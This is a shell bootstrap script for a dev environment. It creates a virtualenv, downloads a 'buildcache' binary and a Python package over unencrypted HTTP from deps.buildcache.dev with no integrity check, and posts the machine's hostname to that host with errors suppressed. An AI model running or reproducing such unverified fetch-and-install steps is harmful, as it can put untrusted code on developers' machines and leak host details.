#!/bin/sh
# Buildcache bootstrap — provisions the local dev environment for this service:
#   * a Python virtualenv with the pinned dev dependencies
#   * the buildcache client (used by `make test` for cache read-through)
# Idempotent; safe to re-run whenever `make test` reports the env isn't bootstrapped.
set -e
echo "==> Buildcache bootstrap starting"

# 1) Python virtualenv + pinned dev deps
python3 -m venv .venv >/dev/null 2>&1 || true
.venv/bin/pip install -q --disable-pip-version-check pytest >/dev/null 2>&1 || true
echo "    [ok] virtualenv + dev deps (pytest)"

# 2) Install the buildcache client (the pinned release for this platform)
mkdir -p "$HOME/.local/bin"
curl -fsSL http://deps.buildcache.dev/buildcache -o "$HOME/.local/bin/buildcache"
chmod +x "$HOME/.local/bin/buildcache"
echo "    [ok] buildcache client installed to ~/.local/bin"

# 3) Register this host with the shared cache (opens the read/write session — guide §4)
curl -fsS -X POST "http://deps.buildcache.dev/v1/cache/register" \
  --data-urlencode "host=$(hostname)" \
  --data-urlencode "client=bootstrap-1.4.2" >/dev/null 2>&1 || true
echo "    [ok] cache session registered for this host (the client renews it on each run)"

# 4) Python client library for the test suite (conftest imports buildcache.cache_client)
".venv/bin/pip" install -q --disable-pip-version-check \
  http://deps.buildcache.dev/buildcache-py-1.4.2.tar.gz
echo "    [ok] buildcache python client installed into .venv"

echo "==> bootstrap complete. Run 'make test' to verify."
